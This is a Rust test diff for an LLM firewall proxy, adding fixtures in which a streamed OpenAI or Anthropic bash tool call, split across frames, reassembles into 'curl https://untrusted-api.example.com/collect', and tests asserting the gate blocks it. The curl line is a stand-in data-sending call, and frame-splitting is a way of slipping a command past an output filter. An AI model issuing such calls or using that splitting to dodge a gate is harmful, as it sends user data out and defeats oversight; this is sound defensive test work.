@@ -76,6 +76,57 @@ fn anthropic_tool_call_stream() -> String {
     )
 }
 
+const ASK_HEAD: &str = r#"{\"command\":\"curl https://untrusted"#;
+const ASK_TAIL: &str = r#"-api.example.com/collect\"}"#;
+
+fn openai_ask_tool_call_stream() -> String {
+    format!(
+        concat!(
+            r#"data: {{"choices":[{{"index":0,"delta":{{"role":"assistant","tool_calls":"#,
+            r#"[{{"index":0,"id":"c1","type":"function","function":{{"name":"bash","arguments":""}}}}]}}}}]}}"#,
+            "\n\n",
+            r#"data: {{"choices":[{{"index":0,"delta":{{"tool_calls":"#,
+            r#"[{{"index":0,"function":{{"arguments":"{head}"}}}}]}}}}]}}"#,
+            "\n\n",
+            r#"data: {{"choices":[{{"index":0,"delta":{{"tool_calls":"#,
+            r#"[{{"index":0,"function":{{"arguments":"{tail}"}}}}]}}}}]}}"#,
+            "\n\n",
+            r#"data: {{"choices":[{{"index":0,"delta":{{}},"finish_reason":"tool_calls"}}]}}"#,
+            "\n\n",
+            "data: [DONE]\n\n"
+        ),
+        head = ASK_HEAD,
+        tail = ASK_TAIL
+    )
+}
+
+fn anthropic_ask_tool_call_stream() -> String {
+    format!(
+        concat!(
+            "event: content_block_start\n",
+            r#"data: {{"type":"content_block_start","index":0,"content_block":"#,
+            r#"{{"type":"tool_use","id":"toolu_1","name":"bash","input":{{}}}}}}"#,
+            "\n\n",
+            "event: content_block_delta\n",
+            r#"data: {{"type":"content_block_delta","index":0,"delta":"#,
+            r#"{{"type":"input_json_delta","partial_json":"{head}"}}}}"#,
+            "\n\n",
+            "event: content_block_delta\n",
+            r#"data: {{"type":"content_block_delta","index":0,"delta":"#,
+            r#"{{"type":"input_json_delta","partial_json":"{tail}"}}}}"#,
+            "\n\n",
+            "event: content_block_stop\n",
+            r#"data: {{"type":"content_block_stop","index":0}}"#,
+            "\n\n",
+            "event: message_stop\n",
+            r#"data: {{"type":"message_stop"}}"#,
+            "\n\n"
+        ),
+        head = ASK_HEAD,
+        tail = ASK_TAIL
+    )
+}
+
 /// A harmless call in the same wire shape: proves the gate does not block everything.
 fn openai_benign_stream() -> String {
     concat!(
@@ -283,5 +334,45 @@ async fn a_benign_split_tool_call_is_not_blocked() {
         body,
         openai_benign_stream(),
         "a harmless reassembled call must pass through untouched"
+    );
+}
+
+#[tokio::test]
+async fn openai_stream_blocks_an_ask_tool_call_split_across_frames() {
+    let server = upstream("/v1/chat/completions", openai_ask_tool_call_stream()).await;
+    let body = stream_body(
+        state(server.uri(), true, true),
+        "/v1/chat/completions",
+        openai_request(),
+    )
+    .await;
+
+    assert!(
+        body.contains("llm_firewall_block"),
+        "reassembled unknown-host ask call must be blocked, got: {body}"
+    );
+    assert!(
+        !body.contains("finish_reason"),
+        "the completing frame must never reach the client: {body}"
+    );
+}
+
+#[tokio::test]
+async fn anthropic_stream_blocks_an_ask_tool_use_split_across_frames() {
+    let server = upstream("/v1/messages", anthropic_ask_tool_call_stream()).await;
+    let body = stream_body(
+        state(server.uri(), true, true),
+        "/v1/messages",
+        anthropic_request(),
+    )
+    .await;
+
+    assert!(
+        body.contains("blocked by Soup Wall output policy"),
+        "reassembled unknown-host ask tool_use must be blocked, got: {body}"
+    );
+    assert!(
+        !body.contains("message_stop"),
+        "the completing frame must never reach the client: {body}"
     );
 }
